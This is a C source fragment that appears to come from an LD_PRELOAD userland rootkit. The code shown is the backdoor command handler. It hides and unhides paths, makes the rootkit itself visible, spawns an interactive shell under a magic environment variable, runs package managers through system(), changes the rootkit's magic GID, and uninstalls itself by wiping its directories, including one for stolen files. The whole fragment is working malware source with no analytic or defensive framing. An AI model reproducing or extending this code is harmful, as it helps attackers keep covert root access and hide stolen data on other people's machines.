#ifdef BACKDOOR_ROLF
void dorolfpls(void){
    printf("\033[0;31m");
    for(int i = 0; i != BDANSI_SIZE; i++)
        printf("%c", bdansi[i]);
    printf("\033[0m\n");

    size_t rolfsize = sizeofarr(rolfs);
    srand(time(NULL));
    char *randrolf = rolfs[rand() % rolfsize];
    printf("\e[31m%s\e[0m\n", randrolf);
    exit(0);
}
#endif

void option_err(char *a0){
    printf("valid commands:\n");
    printf("\t%s hide/unhide <path>\n", a0);
    printf("\t%s uninstall\n", a0);
    printf("\t%s unhideself\n", a0);
    printf("\t%s makelinks\n", a0);
#ifdef READ_GID_FROM_FILE
    printf("\t%s changegid\n", a0);
#endif
#ifdef BACKDOOR_PKGMAN
    char validmans[128], tmp[8];
    memset(validmans, 0, sizeof(validmans));
    for(int i = 0; i != sizeofarr(validpkgmans); i++){
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%s/", validpkgmans[i]);
        strncat(validmans, tmp, 8);
    }
    validmans[strlen(validmans)-1]='\0';
    printf("\t%s %s <args>\n", a0, validmans);
#endif
    exit(0);
}

void eradicatedir(const char *target){
    DIR *dp;
    struct dirent *dir;
    size_t pathlen;

    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR);

    dp = call(COPENDIR, target);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = strlen(target) + strlen(dir->d_name) + 2;
        if(pathlen>PATH_MAX) continue;

        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);

        if((long)call(CUNLINK, path) < 0)
            printf("failed unlink on %s\n", path);
    }
    closedir(dp);
    if((long)call(CRMDIR, target) < 0)
        printf("failed rmdir on %s\n", target);
}

void uninstallbdv(void){
    eradicatedir(INSTALL_DIR);
    eradicatedir(HOMEDIR);
#ifdef FILE_STEAL
    eradicatedir(INTEREST_DIR);
#endif

    hook(CUNLINK);
    if((long)call(CUNLINK, PRELOAD_FILE) < 0)
        printf("failed removing preload file (%s)\n", PRELOAD_FILE);

    char *src, *dest;
    for(int i = 0; i != LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdests[i];

        if((long)call(CUNLINK, src) < 0 && errno != ENOENT)
            printf("failed removing %s (%s)\n", src, basename(dest));
    }
}

void do_self(void){
    /* we need some kind of warning message. this will do for now. */
    printf("unhiding self...\n");

    chdir("/");
    unhide_self();
    system("id");
    printf("you're now totally visible. 'exit' when you want to return to being hidden.\n");

    char *args[3];
    args[0] = "/bin/sh";
    args[1] = "-i";
    args[2] = NULL;

#ifdef SET_MAGIC_ENV_UNHIDE
    char *env[2];
    env[0] = BD_VAR"=1";
    env[1] = NULL;
    hook(CEXECVE);
    call(CEXECVE, args[0], args, env);
#else
    execl(args[0], args[1], NULL);
#endif

    hide_self();
    exit(0);
}

void symlinkstuff(void){
    hook(CACCESS, CSYMLINK);

    char *src, *dest;
    int ok=0, fail=0;
    for(int i = 0; i != LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdests[i];

        if((long)call(CACCESS, src, F_OK) == 0){
            if((long)call(CSYMLINK, src, dest) < 0){
                if(errno != EEXIST)
                    fail++;
                else
                    ok++; // assume thats ok
            }else ok++;
        }
    }

    printf("Links successful: \e[31m%d\e[0m/%d\n", ok, LINKSRCS_SIZE);
    if(fail > 0)
        printf("Failed links: \e[31m%d\e[0m)\n", fail);

    exit(0);
}

/* everything in here calls to misc rootkit utils. */
void dobdvutil(char *const argv[]){
    char *option, *path;
    int path_status;

    option = argv[1];
    if(option == NULL)
        option_err(argv[0]);

#ifdef BACKDOOR_PKGMAN
    char *pkgman;
    for(int pkgmani = 0; pkgmani != sizeofarr(validpkgmans); pkgmani++){
        pkgman = validpkgmans[pkgmani];

        if(!strcmp(pkgman, option)){
            char argbuf[512], tmp[128];
            memset(argbuf, 0, sizeof(argbuf));
            chdir("/");
            unhide_self();
            system("id");
            for(int argi = 1; argv[argi] != NULL; argi++){
                memset(tmp, 0, sizeof(tmp));
                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
                strcat(argbuf, tmp);
            }
            argbuf[strlen(argbuf)-1]='\0';
            printf("system(\"%s\");\n", argbuf);
            system(argbuf);
            exit(0);
        }
    }
#endif

#ifdef READ_GID_FROM_FILE
    if(!strcmp("changegid", option)){
        gid_t newgid;

        printf("current magic GID: %d\n", readgid());
        printf("you are about to change the rootkit's GID.\n");
        printf("this backdoor process will be killed & you'll have to reconnect.\n");
        printf("press enter if you really wanna do this.");
        getchar();
        
        newgid = changerkgid();
        printf("new magic GID: %d\n", newgid);

        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }
#endif

    if(!strcmp("uninstall", option)){
        uninstallbdv();
        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }

    if(!strcmp("unhideself", option))
        do_self();

    if(!strcmp("makelinks", option))
        symlinkstuff();

    // option was neither changegid or unhideself.
    // file op desired.
    path = argv[2];
    if(path == NULL)
        option_err(argv[0]);

    hook(CACCESS);
    path_status = (long)call(CACCESS, path, F_OK);
    if(path_status != 0){
        printf("%s\n", ERR_ACSS_PATH);
        exit(-1);
    }

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err(argv[0]);

    exit(0);
}